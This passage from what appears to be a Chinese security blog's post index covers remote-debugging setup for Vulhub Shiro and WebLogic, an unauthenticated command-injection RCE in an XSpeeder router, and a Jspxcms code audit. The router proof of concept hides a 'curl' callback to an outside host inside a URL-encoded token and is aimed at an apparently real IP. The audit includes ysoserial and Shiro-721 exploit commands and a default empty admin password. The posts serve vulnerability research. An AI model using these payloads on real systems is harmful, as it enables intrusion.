class="string">&quot;8080:8080&quot;</span></span><br><span class="line">    - <span class="string">&quot;5005:5005&quot;</span></span><br><span class="line">   <span class="built_in">command</span>: /usr/bin/java -agentlib:jdwp=transport=dt_socket,server=y,<span class="built_in">suspend</span>=y,address=5005 -jar /shirodemo-1.0-SNAPSHOT.jar </span><br><span class="line"><span class="comment"># docker compose up -d</span></span><br></pre></td></tr></table></figure><p>接下来，还需配置依赖，先将容器中的Jar拷贝出来，并作为库添加。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker cp c0475028d3b2:/shirodemo-1.0-SNAPSHOT.jar ../../base/shiro/1.2.4/code</span></span><br><span class="line">Successfully copied 22.3MB to /Users/r00t/SEC/vulnEnv/vulhub/base/shiro/1.2.4/code</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-apps-remote-debug/idea-add-as-lib.png"></p><p>最后，在IDEA项目中创建一个lib目录，将shirodemo-1.0-SNAPSHOT.jar里BOOT-INF中的lib下所有文件拷贝至IDEA项目中的lib目录里面，并将拷贝出来的所有jar作为库添加。</p><p>至此，就可以打断点进行远程调试了。</p><p><img src="/img/post/java-apps-remote-debug/idea-debug.png"></p><h2 id="0x03-WebLogic"><a href="#0x03-WebLogic" class="headerlink" title="0x03 WebLogic"></a>0x03 WebLogic</h2><p>WebLogic是一个Jave2E应用服务器，不同于Tomcat服务器那么地轻量。下文将以Vulhub中的CVE-2017-10271漏洞环境为例，展示如何对WebLogic进行配置以达到远程调试。</p><p>首先还是修改docker-compose.yml文件，新增一组暴露端口的配置，该8453端口为WebLogic默认的调试端口号。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat docker-compose.yml</span></span><br><span class="line">version: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">services:</span><br><span class="line"> weblogic:</span><br><span class="line">   image: vulhub/weblogic:10.3.6.0-2017</span><br><span class="line">   ports:</span><br><span class="line">    - <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">    - <span class="string">&quot;8453:8453&quot;</span></span><br></pre></td></tr></table></figure><p>启动并进入到容器中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker compose up -d</span></span><br><span class="line"><span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE                           COMMAND              CREATED          STATUS          PORTS                                                                                            NAMES</span><br><span class="line">2cec5c91ab51   vulhub/weblogic:10.3.6.0-2017   <span class="string">&quot;startWebLogic.sh&quot;</span>   47 minutes ago   Up 47 minutes   0.0.0.0:5005-&gt;5005/tcp, :::5005-&gt;5005/tcp, 0.0.0.0:7001-&gt;7001/tcp, :::7001-&gt;7001/tcp, 5556/tcp   cve-2017-10271_weblogic_1</span><br><span class="line"><span class="comment"># docker exec -it 2cec5c91ab51 /bin/bash</span></span><br><span class="line">root@2cec5c91ab51:~/Oracle/Middleware<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>修改WebLogic的setDomainEnv.sh文件，该文件位于<code>/root/Oracle/Middleware/user_projects/domains/base_domain/bin/</code>目录下，在如下图中的位置添加如下两行内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugFlag=&quot;true&quot;</span><br><span class="line">export debugFlag</span><br></pre></td></tr></table></figure><p><img src="/img/post/java-apps-remote-debug/weblogic-debugflag.png"></p><p>退出容器，并重新启动容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker restart 2cec5c91ab51</span></span><br><span class="line">2cec5c91ab51</span><br></pre></td></tr></table></figure><p>再次进入容器，将&#x2F;root&#x2F;Oracle&#x2F;Middleware目录下的modules文件夹和wlserver_10.3文件夹复制出来到一个新目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker exec -it 2cec5c91ab51 /bin/bash</span></span><br><span class="line">root@2cec5c91ab51:~/Oracle/Middleware<span class="comment"># tar -czvf modules.tar.gz modules/ &amp;&amp; tar -czvf wlserver_10.3.tar.gz wlserver_10.3/</span></span><br><span class="line">root@2cec5c91ab51:~/Oracle/Middleware<span class="comment"># exit</span></span><br><span class="line"><span class="comment"># docker cp 2cec5c91ab51:/root/Oracle/Middleware/modules.tar.gz source/</span></span><br><span class="line"><span class="comment"># docker cp 2cec5c91ab51:/root/Oracle/Middleware/wlserver_10.3.tar.gz source/</span></span><br><span class="line"><span class="comment"># ls source/ &amp;&amp; cd source/</span></span><br><span class="line">modules.tar.gz  wlserver_10.3.tar.gz</span><br><span class="line"><span class="comment"># tar -zxf modules.tar.gz &amp;&amp; tar -zxf wlserver_10.3.tar.gz</span></span><br></pre></td></tr></table></figure><p>使用IDEA打开source目录，并将modules文件夹与w1server_10.3&#x2F;server&#x2F;lib文件夹作为库添加。</p><p><img src="/img/post/java-apps-remote-debug/weblogic-addaslib.png"></p><p>新增如下Debug配置。</p><p><img src="/img/post/java-apps-remote-debug/weblogic-debug-conf.png"></p><p>将断点打在<code>wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/WLSServletAdapter#handle</code>方法，并点击Debug绿色按钮，使用浏览器访问<em><a href="http://127.0.0.1:7001/wls-wsat/CoordinatorPortType">http://127.0.0.1:7001/wls-wsat/CoordinatorPortType</a></em>，如下图，成功进行调试。</p><p><img src="/img/post/java-apps-remote-debug/weblogic-debuging.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同迅神行者路由doLoginOut未授权RCE</title>
      <link href="/xspeeder-dologinout-rce.html"/>
      <url>/xspeeder-dologinout-rce.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li><li><a href="#%E5%9B%BA%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%86%E6%9E%90">固件下载分析</a></li><li><a href="#python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">Python代码审计</a></li><li><a href="#%E6%A6%82%E5%BF%B5%E9%AA%8C%E8%AF%81%E6%AD%A5%E9%AA%A4">概念验证步骤</a></li></ul><blockquote><p><strong>引子</strong></p><p>某次HW期间看到该漏洞的利用，遂尝试分析一番。</p></blockquote><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>同迅神行者路由通过系统管理、网络管理、策略管理、监控统计、面板管理五大人机互动管理功能，对流经的所有应用数据进行实时监控与管理。神行者路由流控产品存在未授权命令注入漏洞，攻击者可以利用该漏洞对服务器执行任意命令。</p><h2 id="固件下载分析"><a href="#固件下载分析" class="headerlink" title="固件下载分析"></a>固件下载分析</h2><p>找到厂商官网，下载中心可以直接获取到路由固件包。</p><p><img src="/img/post/xspeeder-dologinout-rce/2.png"></p><p>这里直接对ISO相关文件进行解压，发现Web目录结构如下，若要尝试搭建可以见官方文档，此外，路由默认账号密码是admin:sxzros。</p><p><img src="/img/post/xspeeder-dologinout-rce/4.png"></p><h2 id="Python代码审计"><a href="#Python代码审计" class="headerlink" title="Python代码审计"></a>Python代码审计</h2><p>首先直接查看路由的分配，如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Filename: urls.py</span></span><br><span class="line">urlpatterns = [</span><br><span class="line">url(<span class="string">r&#x27;^favicon.ico$&#x27;</span>,RedirectView.as_view(url=<span class="string">r&#x27;static/assets/img/favicon.ico&#x27;</span>)),</span><br><span class="line">   <span class="comment">#登录</span></span><br><span class="line">url(<span class="string">r&#x27;^$&#x27;</span>,<span class="string">&#x27;xapp.vLogin.index&#x27;</span>),</span><br><span class="line">url(<span class="string">r&#x27;^doLogin/$&#x27;</span>,<span class="string">&#x27;xapp.vLogin.doLogin&#x27;</span>),<span class="comment">#登录验证</span></span><br><span class="line">url(<span class="string">r&#x27;^webInfos/$&#x27;</span>,<span class="string">&#x27;xapp.vLogin.webInfos&#x27;</span>),<span class="comment">#WEB登录信息认证</span></span><br><span class="line">url(<span class="string">r&#x27;^weixinInfos/$&#x27;</span>,<span class="string">&#x27;xapp.vLogin.weixinInfos&#x27;</span>),<span class="comment">#微信登录验证</span></span><br><span class="line">url(<span class="string">r&#x27;^index/$&#x27;</span>,<span class="string">&#x27;xapp.vLogin.index&#x27;</span>),<span class="comment">#注销后的返回页面</span></span><br><span class="line">url(<span class="string">r&#x27;^default/$&#x27;</span>,<span class="string">&#x27;xapp.views.default&#x27;</span>),<span class="comment">#缺省</span></span><br><span class="line">url(<span class="string">r&#x27;^warning/$&#x27;</span>,<span class="string">&#x27;xapp.views.warning&#x27;</span>),<span class="comment">#到期提醒</span></span><br><span class="line">url(<span class="string">r&#x27;^edtPwd/$&#x27;</span>,<span class="string">&#x27;xapp.views.edtPwd&#x27;</span>),<span class="comment">#密码修改</span></span><br><span class="line">url(<span class="string">r&#x27;^doLoginOut/$&#x27;</span>,<span class="string">&#x27;xapp.views.doLoginOut&#x27;</span>),<span class="comment">#退出登录</span></span><br><span class="line">url(<span class="string">r&#x27;^doSyncConfigToSlave/$&#x27;</span>,<span class="string">&#x27;xapp.views.doSyncConfigToSlave&#x27;</span>),<span class="comment">#主备配置同步</span></span><br><span class="line">url(<span class="string">r&#x27;^iosweixinLogin/$&#x27;</span>,<span class="string">&#x27;xapp.views.iosweixinLogin&#x27;</span>),<span class="comment">#登录</span></span><br><span class="line"><span class="comment">#首页</span></span><br><span class="line">url(<span class="string">r&#x27;^index/index/$&#x27;</span>,<span class="string">&#x27;xapp.vIndex.index&#x27;</span>),</span><br></pre></td></tr></table></figure><p>对各个路由对应的方法进行排查，最终发现，在如下代码片段中，<code>edtPwd</code>和<code>doSyncConfigToSlave</code>方法都需要token来鉴权，但<code>doLoginOut</code>方法是没有判断token的，且这个方法存在<code>os.system</code>方法执行系统命令的操作。</p><p>进一步分析<code>doLoginOut</code>方法，可以判断出这个方法是登出操作，在登录成功时，是会在系统某处写一个token文件，而退出就是删除这个token文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Filename: views.py</span></span><br><span class="line"><span class="comment">#修改密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edtPwd</span>(<span class="params">request</span>):</span><br><span class="line"><span class="built_in">map</span>   = request.GET</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="string">&#x27;token&#x27;</span> <span class="keyword">in</span> <span class="built_in">map</span>  <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">map</span>[<span class="string">&#x27;token&#x27;</span>]) != <span class="number">16</span>:</span><br><span class="line"><span class="keyword">return</span> HttpResponseRedirect(<span class="string">&#x27;/index/&#x27;</span>)</span><br><span class="line">spath     = <span class="string">r&#x27;/tmpfile/loginfile/&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">map</span>[<span class="string">&#x27;token&#x27;</span>])</span><br><span class="line">logindic  = cUtil.getLoginToken(spath)</span><br><span class="line">……</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"><span class="comment">#退出</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">doLoginOut</span>(<span class="params">request</span>):</span><br><span class="line"><span class="built_in">map</span>     = request.GET</span><br><span class="line">spath   = <span class="string">r&#x27;/tmpfile/loginfile/&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">map</span>[<span class="string">&#x27;token&#x27;</span>])</span><br><span class="line">delfile = <span class="string">&quot;rm -rf %s&quot;</span>%(spath)</span><br><span class="line">os.system(delfile)</span><br><span class="line"><span class="keyword">return</span> HttpResponse(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#主备配置同步</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">doSyncConfigToSlave</span>(<span class="params">request</span>):</span><br><span class="line"><span class="built_in">map</span> = request.GET</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="string">&#x27;token&#x27;</span> <span class="keyword">in</span> <span class="built_in">map</span>  <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">map</span>[<span class="string">&#x27;token&#x27;</span>]) != <span class="number">16</span>:</span><br><span class="line"><span class="keyword">return</span> HttpResponseRedirect(<span class="string">&#x27;/index/&#x27;</span>)</span><br><span class="line">spath     = <span class="string">r&#x27;/tmpfile/loginfile/&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">map</span>[<span class="string">&#x27;token&#x27;</span>])</span><br><span class="line">……</span><br><span class="line"><span class="keyword">return</span> JsonResponse(<span class="built_in">list</span>,safe=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h2 id="概念验证步骤"><a href="#概念验证步骤" class="headerlink" title="概念验证步骤"></a>概念验证步骤</h2><p>根据如上逻辑，构造一个POC，如下所示，成功RCE。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /doLoginOut/?token=%<span class="number">31</span>%<span class="number">31</span>%<span class="number">31</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">63</span>%<span class="number">75</span>%<span class="number">72</span>%6c%<span class="number">20</span>%<span class="number">31</span>%<span class="number">62</span>%<span class="number">35</span>%<span class="number">65</span>%<span class="number">39</span>%<span class="number">34</span>%<span class="number">35</span>%<span class="number">38</span>%2e%<span class="number">64</span>%6e%<span class="number">73</span>%2e%<span class="number">31</span>%<span class="number">34</span>%<span class="number">33</span>%<span class="number">33</span>%2e%<span class="number">65</span>%<span class="number">75</span>%2e%6f%<span class="number">72</span>%<span class="number">67</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">112.93</span><span class="number">.240</span><span class="number">.78</span>:<span class="number">4433</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">11_4</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">106.0</span><span class="number">.5220</span><span class="number">.146</span> Safari/<span class="number">537.36</span> OPR/<span class="number">83.0</span><span class="number">.4416</span><span class="number">.120</span></span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=<span class="number">0.5</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Sun, 09 Oct <span class="number">2022</span> <span class="number">10</span>:<span class="number">53</span>:<span class="number">55</span> GMT</span><br><span class="line">Content-<span class="type">Type</span>: text/html; charset=utf-<span class="number">8</span></span><br><span class="line">Connection: close</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="/img/post/xspeeder-dologinout-rce/5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> code-audit </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jspxcms审计记录</title>
      <link href="/jspxcms-code-audit-learn.html"/>
      <url>/jspxcms-code-audit-learn.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E6%8A%80%E6%9C%AF%E6%A0%88">0x00 技术栈</a></li><li><a href="#0x01-%E7%BB%84%E4%BB%B6%E4%BE%9D%E8%B5%96">0x01 组件依赖</a></li><li><a href="#0x02-%E5%8A%9F%E8%83%BD%E7%82%B9%E7%86%9F%E6%82%89">0x02 功能点熟悉</a></li><li><a href="#0x03-%E9%BB%98%E8%AE%A4%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE">0x03 默认不安全配置</a></li><li><a href="#0x04-rce">0x04 RCE</a><ul><li><a href="#Shiro-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Shiro 721反序列化漏洞</a></li><li><a href="#zip-slip%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E">Zip Slip任意文件覆盖漏洞</a></li><li><a href="#freemarker-ssti">Freemarker SSTI</a></li></ul></li><li><a href="#0x05-xss">0x05 XSS</a></li><li><a href="#0x06-ssrf">0x06 SSRF</a><ul><li><a href="#httpclientexecute">HttpClient.execute()</a></li><li><a href="#urlopenconnection">URL.openConnection()</a></li></ul></li></ul><h2 id="0x00-技术栈"><a href="#0x00-技术栈" class="headerlink" title="0x00 技术栈"></a>0x00 技术栈</h2><p>该项目使用了SpringMVC框架、Spring Data JPA框架，Hibernate作为数据库持久化框架，Shiro作为安全框架，以及Freemarker模版引擎。</p><h2 id="0x01-组件依赖"><a href="#0x01-组件依赖" class="headerlink" title="0x01 组件依赖"></a>0x01 组件依赖</h2><p>通过观察Maven同步的依赖库，发现部分使用的组件和版本如下。</p><table><thead><tr><th>组件</th><th>版本</th></tr></thead><tbody><tr><td>commons-beanutils</td><td>1.9.3</td></tr><tr><td>commons-collections</td><td>3.2.2</td></tr><tr><td>commons-logging</td><td>1.1.3</td></tr><tr><td>freemarker</td><td>2.3.28</td></tr><tr><td>shiro-core</td><td>1.3.2</td></tr><tr><td>hibernate-core</td><td>5.0.12</td></tr><tr><td>log4j</td><td>1.2.17</td></tr><tr><td>snakeyaml</td><td>1.17</td></tr></tbody></table><h2 id="0x02-功能点熟悉"><a href="#0x02-功能点熟悉" class="headerlink" title="0x02 功能点熟悉"></a>0x02 功能点熟悉</h2><p>在正式进行审计前，应当对这个Web应用的相关功能点了解的足够全面、足够熟悉。</p><p>由于该项目是个开源项目，在官网也提供了使用手册，通过查阅文档可以更加全面的了解该应用的所有功能点。当然，也可以在安装该环境后，自行探索相关功能点。</p><h2 id="0x03-默认不安全配置"><a href="#0x03-默认不安全配置" class="headerlink" title="0x03 默认不安全配置"></a>0x03 默认不安全配置</h2><p>通过查阅文档发现该应用存在管理后台。</p><p><img src="/img/post/jspxcms-code-audit-learn/0.png"></p><p>管理员账户名为admin，默认无密码就可以直接登录进去。除此之外，此处的登录功能连验证码都未设置，存在被暴力破解的风险。</p><h2 id="0x04-RCE"><a href="#0x04-RCE" class="headerlink" title="0x04 RCE"></a>0x04 RCE</h2><h3 id="Shiro-721反序列化漏洞"><a href="#Shiro-721反序列化漏洞" class="headerlink" title="Shiro 721反序列化漏洞"></a>Shiro 721反序列化漏洞</h3><p>通过如上使用到的依赖组件，可得知使用到了1.3.2版本的Shiro，满足Padding Oracle Attack漏洞的条件，且存在1.9.3版本的commons-beanutils，可以直接使用CommonsBeanutils1链进行攻击。虽然该漏洞存在，但在实际场景中不太容易复现成功。</p><p>首先使用ysoserial生成反序列化payload。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">&quot;open -a Calculator&quot;</span> &gt; rce.ser</span><br></pre></td></tr></table></figure><p>第二步，获取一个有效的rememberMe。</p><p><img src="/img/post/jspxcms-code-audit-learn/1.png"></p><p>然后通过<a href="https://github.com/wuppp/shiro_rce_exp">https://github.com/wuppp/shiro_rce_exp</a>这个工具，进行爆破。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exp.<span class="property">py</span> <span class="attr">http</span>:<span class="comment">//127.0.0.1:8088/ tfG3gjvoIwe+kHjzfNRddP9QL7uy2/GeTBASaYZ83WW6vaGZCgUDp2TfrOVBvflVyxuJ+yGzGvyjDcK031vUCzdfadQ6TWIjFrVuRoqCeZdDCwqP7gWSf4HoONl8QGdWsPHH6D4agsz1ZRmWwen5uyzcVpZdjKFzv5117tSHFHPj+hcgmfL0L+v90TKHmgiWLSiEADvbL/qfmCo8HQCYtkK6DxuWQ35IvSoOCRaV5GpeKRlvcJVejGiqKQsx20N12IBKxIQBJ1htcyh3SJic8sQT6anMnNKe/FoRmOTxhbIwnzwCqGrDfJw1otx1YBLJTcfeXDuDk/41eJ3pLQ2VTuPdU/gIu/p8zf/7APjcQDI8C2wljK8zKkn4JwDt1/jb25zxw05FohDyusuQAc+TRBkyM6s1zk7ARDnyG9PQeqUdCxeubu5rbDxFVQM0bTWkL1fnqtt/fciGVU84aonJA2uUYIOI5xrdqUDm1ySOHHZGYWu8l109tt/aIJrdL2xxyK7BL6Ul3Ttd4Nw0SQqO0FaUWV2IO/oBandsk7kavfmdN+LvX30T7iLqIUehhprLChbJX4z8asfm4VRL/dJBzr6Z14U/cW8l90ULB4Z4qU3RbIdl+yiODUUk7exp/exwjeKrdd068p0yTiZYbx+q8BcAgugBILOeS791WJMm2zFwDumcDtOM7S+5BpqRQXUrCwpthYy9drXPpyCrcbkFLRqdArYBWWpwx07VaqmPioCSX7klaicZtH9ho6D4fEWZ/9oWm9Angj6+GaTn0Qlp1g== rce.ser</span></span><br></pre></td></tr></table></figure><p>爆破了几个小时后，终于爆出rememberMe cookies。</p><p><img src="/img/post/jspxcms-code-audit-learn/2.png"></p><p>将如上爆出的rememberMe cookies放置在BurpSuite中，并发包，可以发现计算机成功弹出。</p><p><img src="/img/post/jspxcms-code-audit-learn/3.png"></p><h3 id="Zip-Slip任意文件覆盖漏洞"><a href="#Zip-Slip任意文件覆盖漏洞" class="headerlink" title="Zip Slip任意文件覆盖漏洞"></a>Zip Slip任意文件覆盖漏洞</h3><p>通过<a href="http://127.0.0.1:8088/cmscp/index.do">http://127.0.0.1:8088/cmscp/index.do</a>，使用admin账户加空密码登录进后台，在后台可以发现有相关上传功能。</p><p><img src="/img/post/jspxcms-code-audit-learn/4.png"></p><p>尝试上传一个普通的文本文件，是能正常访问的，但当上传jsp后缀时，访问就会404。</p><p>查看上传的文件的目录权限，可发现并无执行权限。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -al src/main/webapp/uploads/<span class="number">1</span> </span><br><span class="line">total <span class="number">16</span></span><br><span class="line">drwxr-xr-x  <span class="number">4</span> r00t  staff  <span class="number">128</span> <span class="title class_">Mar</span> <span class="number">16</span> <span class="number">12</span>:<span class="number">45</span> .</span><br><span class="line">drwxrwxr-x  <span class="number">4</span> r00t  staff  <span class="number">128</span> <span class="title class_">Mar</span> <span class="number">16</span> <span class="number">12</span>:<span class="number">27</span> ..</span><br><span class="line">-rw-r--r--  <span class="number">1</span> r00t  staff  <span class="number">288</span> <span class="title class_">Mar</span> <span class="number">16</span> <span class="number">12</span>:<span class="number">30</span> test.<span class="property">jsp</span></span><br><span class="line">-rw-r--r--  <span class="number">1</span> r00t  staff    <span class="number">5</span> <span class="title class_">Mar</span> <span class="number">16</span> <span class="number">12</span>:<span class="number">28</span> test.<span class="property">txt</span></span><br></pre></td></tr></table></figure><p>继续将目光盯向ZIP文件上传功能，上传一个压缩包，并抓包。</p><p><img src="/img/post/jspxcms-code-audit-learn/5.png"></p><p>回到网页，可以发现压缩包中的文件被自动解压了。</p><p><img src="/img/post/jspxcms-code-audit-learn/6.png"></p><p>回到IDEA中，审计zip上传相关方法。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title class_">RequiresPermissions</span>(<span class="string">&quot;core:web_file_2:zip_upload&quot;</span>)</span><br><span class="line">@<span class="title class_">RequestMapping</span>(<span class="string">&quot;zip_upload.do&quot;</span>)</span><br><span class="line">public <span class="keyword">void</span> <span class="title function_">zipUpload</span>(@<span class="title class_">RequestParam</span>(value = <span class="string">&quot;file&quot;</span>, required = <span class="literal">false</span>) <span class="title class_">MultipartFile</span> file, <span class="title class_">String</span> parentId,</span><br><span class="line"><span class="title class_">HttpServletRequest</span> request, <span class="title class_">HttpServletResponse</span> response, <span class="title class_">RedirectAttributes</span> ra) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line"><span class="variable language_">super</span>.<span class="title function_">zipUpload</span>(file, parentId, request, response, ra);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>zipUpload</code>方法，在其中使用到了<code>AntZipUtils.unzip</code>方法进行解压缩。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="keyword">void</span> <span class="title function_">zipUpload</span>(<span class="title class_">MultipartFile</span> file, <span class="title class_">String</span> parentId, <span class="title class_">HttpServletRequest</span> request,</span><br><span class="line"><span class="title class_">HttpServletResponse</span> response, <span class="title class_">RedirectAttributes</span> ra) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line"><span class="title class_">Site</span> site = <span class="title class_">Context</span>.<span class="title function_">getCurrentSite</span>();</span><br><span class="line"><span class="title class_">FileHandler</span> fileHandler = <span class="title function_">getFileHandler</span>(site);</span><br><span class="line"><span class="keyword">if</span> (!(fileHandler <span class="keyword">instanceof</span> <span class="title class_">LocalFileHandler</span>)) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmsException</span>(<span class="string">&quot;ftp cannot support ZIP.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">LocalFileHandler</span> localFileHandler = (<span class="title class_">LocalFileHandler</span>) fileHandler;</span><br><span class="line"><span class="title class_">String</span> base = <span class="title function_">getBase</span>(site);</span><br><span class="line"><span class="comment">// parentId = parentId == null ? base : parentId;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title class_">Validations</span>.<span class="title function_">uri</span>(parentId, base)) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmsException</span>(<span class="string">&quot;invalidURI&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">File</span> parentFile = localFileHandler.<span class="title function_">getFile</span>(parentId);</span><br><span class="line"><span class="title class_">File</span> tempFile = <span class="title class_">FilesEx</span>.<span class="title function_">getTempFile</span>();</span><br><span class="line">file.<span class="title function_">transferTo</span>(tempFile);</span><br><span class="line"><span class="title class_">AntZipUtils</span>.<span class="title function_">unzip</span>(tempFile, parentFile);</span><br><span class="line">tempFile.<span class="title function_">delete</span>();</span><br><span class="line"></span><br><span class="line">logService.<span class="title function_">operation</span>(<span class="string">&quot;opr.webFile.zipUpload&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + file.<span class="title function_">getOriginalFilename</span>(), <span class="literal">null</span>, <span class="literal">null</span>, request);</span><br><span class="line">logger.<span class="title function_">info</span>(<span class="string">&quot;zip upload file, name=&#123;&#125;.&quot;</span>, 